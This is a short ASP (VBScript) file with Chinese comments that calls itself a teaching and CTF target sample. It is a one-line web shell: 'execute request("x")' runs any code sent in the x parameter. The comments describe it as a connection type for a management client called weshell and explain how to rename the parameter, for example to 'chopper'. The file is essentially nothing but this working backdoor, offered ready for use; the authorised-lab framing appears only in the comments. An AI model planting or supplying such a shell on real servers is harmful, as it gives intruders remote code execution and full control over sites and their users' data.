<%
' 教学 / CTF 靶场样本：ASP (VBScript 引擎) execute 型一句话马
' 仅用于你自有或已获明确授权的靶机环境。
' 连接参数名为 x；管理端通过此参数提交一小段 VBScript 代码，由 execute 注入执行。
' 对应 weshell 连接类型：asp-vbs（ASP execute 型）。
' 若想自定义参数名（如 chopper），把下面 request("x") 改成 request("chopper")，
' 并在 weshell 新建靶机时「参数名」填一致的值即可。

execute request("x")
%>
